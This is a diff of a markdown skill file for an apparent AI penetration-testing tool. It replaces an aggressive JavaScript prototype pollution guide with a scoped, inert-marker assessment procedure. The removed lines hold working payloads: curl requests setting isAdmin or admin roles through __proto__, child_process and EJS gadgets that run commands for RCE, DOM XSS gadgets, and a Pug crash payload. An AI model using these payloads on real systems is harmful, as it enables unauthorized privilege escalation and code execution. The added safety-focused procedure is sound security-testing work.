@@ -1,132 +1,71 @@
 ---
 name: attack-prototype-pollution
-description: "JavaScript prototype pollution — __proto__ injection, constructor.prototype, gadget chain exploitation"
+description: "Assess JavaScript prototype pollution in client and server object-processing paths using inert markers"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - prototype-pollution
-  - javascript
-  - web
-  - xss
-  - attack
-tech_stack:
-  - javascript
-  - nodejs
-  - web
-cwe_ids:
-  - CWE-1321
-chains_with:
-  - attack-ssti
-prerequisites: []
-severity_boost:
-  attack-ssti: "Prototype pollution → SSTI gadgets = RCE"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [prototype-pollution, javascript, nodejs, object-merge, validation]
+tech_stack: [javascript, nodejs, browser, json]
+cwe_ids: [CWE-1321]
+chains_with: [attack-ssti, attack-xss, attack-triage-validation]
+prerequisites:
+  - "Authorized application or isolated test environment"
+  - "A harmless marker and a way to observe only test-owned state"
+sources:
+  - "https://github.com/uphiago/recon-skills"
+  - "https://portswigger.net/web-security/prototype-pollution"
 ---
 
-# Prototype Pollution
+# JavaScript Prototype Pollution Assessment
 
 ## Objective
 
-Exploit JavaScript prototype pollution to modify Object.prototype, leading to XSS, privilege escalation, or RCE via gadget chains.
+Determine whether attacker-controlled input modifies an object's prototype or prototype-related properties in a way that changes security-relevant behavior. A suspicious key, parser acceptance, or local console result alone does not prove impact.
 
-## Testing Methodology
+## Scope and safety
 
-### Phase 1: Client-Side Detection
+Use a local lab or a dedicated test account. Start with inert properties and avoid payloads that execute commands, alter privileged settings, affect other tenants, or persist changes globally. Do not attempt RCE gadget chains on production systems.
 
-**URL-based pollution:**
-```
-https://TARGET/?__proto__[polluted]=1
-https://TARGET/?__proto__.polluted=1
-https://TARGET/?constructor[prototype][polluted]=1
-https://TARGET/#__proto__[polluted]=1
-```
+## Procedure
 
-Verify in browser console:
-```javascript
-console.log(({}).polluted) // Should print "1" if vulnerable
-```
+### 1. Identify merge and parsing paths
 
-### Phase 2: JSON Body Pollution
+Review URL/query parsing, JSON body handling, recursive merge utilities, configuration loaders, object assignment, and dependency versions. Search code and traffic for `__proto__`, `constructor`, `prototype`, and nested object merges. Treat strings as indicators, not proof.
 
-```bash
-# Merge/patch endpoints
-curl -X POST https://TARGET/api/settings \
-  -H "Content-Type: application/json" \
-  -d '{"__proto__": {"isAdmin": true}}'
+### 2. Establish a baseline
 
-curl -X PATCH https://TARGET/api/user/profile \
-  -d '{"constructor": {"prototype": {"role": "admin"}}}'
+Record the normal response and relevant behavior before submitting any marker. Determine whether the candidate path is client-side or server-side, and whether data is merged into ordinary objects or a safer structure.
 
-# Nested object merge
-curl -X PUT https://TARGET/api/config \
-  -d '{"a": {"__proto__": {"polluted": true}}}'
-```
+### 3. Test an inert marker
 
-### Phase 3: Server-Side Detection (Node.js)
+In a local or controlled environment, use a unique harmless property through one input path at a time. Check whether the marker appears only in the submitted object or also affects a newly created unrelated object or downstream logic. Avoid mutating shared application state in a live multi-user environment.
 
-```bash
-# RCE via child_process gadget
-curl -X POST https://TARGET/api/merge \
-  -H "Content-Type: application/json" \
-  -d '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"child_process\").execSync(\"id\").toString())", "NODE_OPTIONS": "--require /proc/self/cmdline"}}'
+### 4. Trace the gadget or sink
 
-# EJS template gadget
-curl -X POST https://TARGET/api/settings \
-  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'
+If pollution is observed, identify a concrete property that changes security-relevant behavior: authorization defaults, template options, URL handling, or another documented sink. Do not assume XSS or RCE from pollution alone. Validate downstream impact separately with `attack-xss` or the relevant approved skill.
 
-# Handlebars gadget
-curl -X POST https://TARGET/api/settings \
-  -d '{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "params": [], "path": {"type": "PathExpression", "original": "constructor"}}]}}'
-```
+### 5. Compare client and server behavior
 
-### Phase 4: Client-Side Gadgets
+For browser code, inspect whether the pollution is limited to the current page/context and whether it affects a real sink. For Node.js/server paths, use staging or a test harness to verify process-level impact without touching production users or secrets.
 
-Common DOM gadgets when `Object.prototype` is polluted:
+### 6. Review dependency and remediation context
 
-```javascript
-// innerHTML gadget
-Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
+Record the affected merge function/library and version evidence. Prefer safe data structures, schema allowlists, explicit key rejection for dangerous prototype-related keys, and patched dependencies. A dependency version alone is not a finding.
 
-// src gadget
-Object.prototype.src = 'javascript:alert(1)'
+## Common false positives
 
-// href gadget
-Object.prototype.href = 'javascript:alert(1)'
+- The input contains `__proto__` but the parser treats it as an ordinary own property.
+- Pollution is confined to a test object and reaches no security-relevant sink.
+- A scanner reports a payload without observing state change.
+- An XSS/RCE gadget is hypothesized but not demonstrated.
+- A dependency version is old but the vulnerable code path is not reachable.
 
-// data-* attributes
-Object.prototype['data-tooltip'] = '<img src=x onerror=alert(1)>'
-```
+## Evidence and output
 
-### Phase 5: Framework-Specific
+Return `input_path`, `runtime_context`, `marker_used`, `baseline_behavior`, `prototype_effect_confirmed`, `affected_sink`, `security_impact`, `cleanup_status`, `confidence`, and redacted evidence. Keep production secrets and target data out of logs.
 
-**Express.js / Pug:**
-```json
-{"__proto__": {"block": {"type": "Text", "val": "x]));process.exit()//"}}}
-```
+## Related skills
 
-**Lodash merge:**
-```json
-{"__proto__": {"polluted": true}}
-```
-
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| Server-side RCE via prototype pollution gadget | Critical (P1) |
-| Privilege escalation (isAdmin=true) | Critical (P1) |
-| Client-side XSS via DOM gadget | High (P2) |
-| Prototype pollution without known gadget | Medium (P3) |
-
-## Evidence Requirements
-
-- Endpoint accepting merge/deep-copy of user input
-- Payload sent (__proto__ or constructor.prototype)
-- Proof of pollution (new property on empty object)
-- For RCE: command output
-- For XSS: JavaScript execution proof
-
-## References
-
-- [PortSwigger: Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
-- [Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
+- `attack-xss` — validate client-side execution separately.
+- `attack-ssti` — template/server-side sinks, if applicable.
+- `attack-triage-validation` — establish impact and rule out false positives.
